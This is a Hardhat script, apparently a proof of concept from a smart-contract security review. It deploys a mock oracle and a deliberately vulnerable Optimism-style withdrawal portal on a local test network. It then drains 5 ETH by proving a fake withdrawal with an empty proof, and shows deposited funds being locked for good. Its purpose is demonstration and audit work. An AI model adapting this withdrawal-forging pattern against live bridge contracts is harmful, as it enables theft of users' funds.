import { ethers } from "hardhat";

async function main() {
  console.log("Starting Missing State Root Verification Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy L2Oracle mock
  const L2OracleMock = await ethers.getContractFactory("L2OracleMock");
  const oracle = await L2OracleMock.deploy();
  await oracle.deployed();
  console.log(`L2OracleMock deployed at: ${oracle.address}`);
  
  // Deploy vulnerable optimism portal
  const VulnerablePortal = await ethers.getContractFactory("VulnerableOptimismPortal");
  const portal = await VulnerablePortal.deploy(oracle.address);
  await portal.deployed();
  console.log(`VulnerableOptimismPortal deployed at: ${portal.address}`);
  
  // Fund the portal with ETH
  const [owner, user1, attacker] = await ethers.getSigners();
  await owner.sendTransaction({
    to: portal.address,
    value: ethers.utils.parseEther("10")
  });
  console.log(`Portal funded with 10 ETH`);
  
  // Create a withdrawal transaction (that in reality never existed on L2)
  console.log("\nCreating a fake withdrawal transaction...");
  
  const fakeWithdrawal = {
    target: attacker.address,
    value: ethers.utils.parseEther("5"),
    nonce: 1,
    data: "0x"
  };
  
  // In a secure system, we would need to provide:
  // 1. A valid state root from the oracle
  // 2. A valid merkle proof showing the withdrawal exists
  
  // Set a fake state root in the oracle (in reality, this would come from L2 consensus)
  const fakeStateRoot = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("fake-state-root"));
  await oracle.setStateRoot(100, fakeStateRoot); // Block 100
  console.log(`Set fake state root in the oracle: ${fakeStateRoot}`);
  
  // Check initial balances
  const initialPortalBalance = await ethers.provider.getBalance(portal.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`Initial portal balance: ${ethers.utils.formatEther(initialPortalBalance)} ETH`);
  console.log(`Initial attacker balance: ${ethers.utils.formatEther(initialAttackerBalance)} ETH`);
  
  // Execute the attack - prove and finalize a withdrawal
  console.log("\nExecuting the attack (exploiting missing state root verification)...");
  
  // 1. Prove the withdrawal without actually providing a valid proof
  // The vulnerable contract doesn't verify proofs against the state root
  const emptyProof = "0x";
  const proveWithdrawalTx = await portal.connect(attacker).proveWithdrawalTransaction(
    fakeWithdrawal,
    fakeStateRoot,
    emptyProof
  );
  await proveWithdrawalTx.wait();
  console.log("Fake withdrawal transaction proven without valid proof");
  
  // 2. Finalize the withdrawal to get the funds
  const finalizeWithdrawalTx = await portal.connect(attacker).finalizeWithdrawalTransaction(
    fakeWithdrawal
  );
  await finalizeWithdrawalTx.wait();
  console.log("Fake withdrawal transaction finalized");
  
  // Check final balances
  const finalPortalBalance = await ethers.provider.getBalance(portal.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`Final portal balance: ${ethers.utils.formatEther(finalPortalBalance)} ETH`);
  console.log(`Final attacker balance (minus gas costs): ~${ethers.utils.formatEther(finalAttackerBalance)} ETH`);
  
  // Calculate the balance change for the attacker (subtracting gas costs is complex, so we just look at portal balance)
  const portalBalanceChange = initialPortalBalance.sub(finalPortalBalance);
  console.log(`Portal balance reduction: ${ethers.utils.formatEther(portalBalanceChange)} ETH`);
  
  // Verify the attack was successful
  if (portalBalanceChange.gte(ethers.utils.parseEther("4.99"))) { // Allow for some rounding/gas costs
    console.log("\n✅ ATTACK SUCCESSFUL: Funds were withdrawn without valid proof");
  } else {
    console.log("\n❌ ATTACK FAILED: Could not withdraw funds");
  }
  
  // Demonstrate fund locking vulnerability
  console.log("\nDemonstrating fund locking vulnerability...");
  
  // Lock funds in the portal
  try {
    await portal.connect(user1).lockFunds({ value: ethers.utils.parseEther("1") });
    console.log("Locked 1 ETH in the portal");
    
    // Try to release the funds
    try {
      await portal.connect(user1).releaseFunds();
      console.log("Funds released (this should not happen)");
    } catch (error) {
      console.log("The releaseFunds function is disabled - funds are permanently locked");
      console.log("\n✅ LOCK ATTACK SUCCESSFUL: Funds were permanently locked");
    }
  } catch (error) {
    console.log("Failed to demonstrate fund locking vulnerability");
    console.log("\n❌ LOCK ATTACK FAILED");
  }
  
  console.log("\nVulnerability demonstration complete.");
}

// Ensure this can be called directly as well as imported
if (require.main === module) {
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

export default main;
